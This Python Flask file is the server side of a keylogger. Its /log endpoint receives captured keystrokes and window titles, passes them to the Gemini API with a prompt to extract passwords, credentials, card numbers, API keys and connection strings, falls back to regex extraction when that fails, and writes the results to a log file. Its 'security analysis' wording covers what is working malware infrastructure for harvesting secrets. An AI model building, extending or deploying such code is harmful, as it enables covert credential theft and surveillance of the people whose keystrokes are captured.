from flask import Flask, request, jsonify
from datetime import datetime, timezone
import google.generativeai as genai
import json
import os
import threading

app = Flask(__name__)

# Configure Gemini API
GOOGLE_API_KEY = ''  # Replace with your API key
genai.configure(api_key=GOOGLE_API_KEY)

# Initialize Gemini model with the correct model name
model = genai.GenerativeModel('gemini-1.5-flash')  # Updated model name

# File logging configuration
LOG_FILE = 'keylogger_analysis.txt'
file_lock = threading.Lock()

def write_to_file(timestamp, window_title, original_text, analysis):
    """Write formatted log entry to file"""
    with file_lock:
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"TIMESTAMP: {timestamp}\n")
                f.write(f"APPLICATION: {window_title}\n")
                f.write("-" * 80 + "\n")
                f.write("ORIGINAL KEYLOGS:\n")
                f.write(f"{original_text}\n")
                f.write("-" * 80 + "\n")
                f.write("SENSITIVE INFORMATION ANALYSIS:\n")
                f.write(f"{analysis}\n")
                f.write("=" * 80 + "\n\n")
        except Exception as e:
            print(f"Error writing to file: {str(e)}")

def initialize_log_file():
    """Initialize the log file with header"""
    header = f"""
KEYLOGGER SECURITY ANALYSIS LOG
Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}
Model: gemini-1.5-flash
Log File: {LOG_FILE}

This file contains keystroke analysis for sensitive information detection.
Each entry includes timestamp, application name, original keylogs, and AI analysis.

""" + "=" * 80 + "\n\n"
    
    try:
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write(header)
        print(f"✓ Log file initialized: {LOG_FILE}")
    except Exception as e:
        print(f"✗ Error initializing log file: {str(e)}")

def analyze_text_with_gemini(text, window_title):
    """Analyze text using Gemini API for sensitive information"""
    prompt = f"""
    Analyze the following text for any sensitive information like:
    - Passwords or credentials
    - Email addresses
    - Phone numbers
    - Credit card numbers
    - Personal identification numbers
    - API keys or tokens
    - Private URLs or internal links
    - Database connection strings
    
    Text to analyze:
    Window: {window_title}
    Content: {text}
    
    Provide a clear, structured response. If sensitive information is found, list each type with examples.
    If no sensitive information is found, respond with "No sensitive information detected".
    Be specific and concise in your analysis.
    """
    
    try:
        response = model.generate_content(prompt)
        analysis = response.text.strip()
        return analysis
    except Exception as e:
        print(f"Gemini API Error: {str(e)}")
        # Fallback to basic pattern matching if Gemini fails
        return fallback_analysis(text)

def fallback_analysis(text):
    """Fallback analysis using basic pattern matching"""
    import re
    
    findings = []
    
    # Email pattern
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    emails = re.findall(email_pattern, text)
    if emails:
        findings.append(f"Email addresses: {', '.join(emails)}")
    
    # Phone number pattern (basic)
    phone_pattern = r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'
    phones = re.findall(phone_pattern, text)
    if phones:
        findings.append(f"Phone numbers: {', '.join(phones)}")
    
    # Credit card pattern (basic)
    cc_pattern = r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b'
    ccs = re.findall(cc_pattern, text)
    if ccs:
        findings.append(f"Potential credit card numbers: {', '.join(ccs)}")
    
    # API key pattern (basic - looks for long alphanumeric strings)
    api_pattern = r'\b[A-Za-z0-9]{20,}\b'
    apis = re.findall(api_pattern, text)
    if apis:
        findings.append(f"Potential API keys: {', '.join(apis[:3])}{'...' if len(apis) > 3 else ''}")
    
    # Password-like patterns (common password indicators)
    password_indicators = ['password', 'passwd', 'pwd', 'pass', 'secret', 'key', 'token']
    for indicator in password_indicators:
        if indicator.lower() in text.lower():
            findings.append(f"Potential password-related content detected (contains '{indicator}')")
            break
    
    if findings:
        return "[FALLBACK ANALYSIS]\n" + "\n".join(f"• {finding}" for finding in findings)
    else:
        return "No sensitive information detected (fallback analysis)"

def print_server_info():
    """Print basic server information"""
    print("\nKeylogger Server with Gemini Analysis Started")
    print("=" * 50)
    print(f"Server running at: http://localhost:5000")
    print(f"Log file: {LOG_FILE}")
    print("Analyzing keystrokes for sensitive information...")
    print(f"Using model: gemini-1.5-flash")
    print("=" * 50 + "\n")

def test_gemini_connection():
    """Test if Gemini API is working"""
    try:
        response = model.generate_content("Hello, can you respond with 'API working'?")
        print(f"✓ Gemini API test successful: {response.text.strip()}")
        return True
    except Exception as e:
        print(f"✗ Gemini API test failed: {str(e)}")
        print("Will use fallback analysis for sensitive data detection")
        return False

@app.route('/log', methods=['POST'])
def log_keystroke():
    try:
        data = request.get_json()
        current_time = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
        
        text = data.get('keys', '').strip()
        window = data.get('window', 'Unknown Application')
        
        # Skip analysis for very short text (less than 3 characters)
        if len(text) < 3:
            # Still log short entries but mark them as skipped
            analysis = "Analysis skipped (text too short)"
        else:
            # Analyze text with Gemini
            analysis = analyze_text_with_gemini(text, window)
        
        # Write to file
        write_to_file(current_time, window, text, analysis)
        
        # Print to console (optional, can be disabled for better performance)
        print(f"[{current_time}] {window}: {text[:50]}{'...' if len(text) > 50 else ''}")
        if len(text) >= 3:
            print(f"Analysis: {analysis[:100]}{'...' if len(analysis) > 100 else ''}")
        print("-" * 40)
        
        return jsonify({"status": "success", "logged": True})
        
    except Exception as e:
        error_msg = f"Server error: {str(e)}"
        print(error_msg)
        
        # Log errors to file as well
        current_time = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
        write_to_file(current_time, "ERROR", str(data), f"ERROR: {error_msg}")
        
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "model": "gemini-1.5-flash",
        "log_file": LOG_FILE,
        "log_exists": os.path.exists(LOG_FILE)
    })

@app.route('/stats', methods=['GET'])
def get_stats():
    """Get basic statistics about logged entries"""
    try:
        if not os.path.exists(LOG_FILE):
            return jsonify({"error": "Log file not found"})
        
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            
        # Count entries (each entry starts with a line of '=')
        entry_count = content.count('=' * 80) - 1  # Subtract 1 for header
        file_size = os.path.getsize(LOG_FILE)
        
        return jsonify({
            "total_entries": max(0, entry_count),
            "file_size_bytes": file_size,
            "file_size_mb": round(file_size / (1024 * 1024), 2),
            "log_file": LOG_FILE
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print_server_info()
    
    # Initialize log file
    initialize_log_file()
    
    # Test Gemini connection on startup
    test_gemini_connection()
    
    print(f"All keylog analysis will be saved to: {LOG_FILE}")
    print("Starting server...\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)
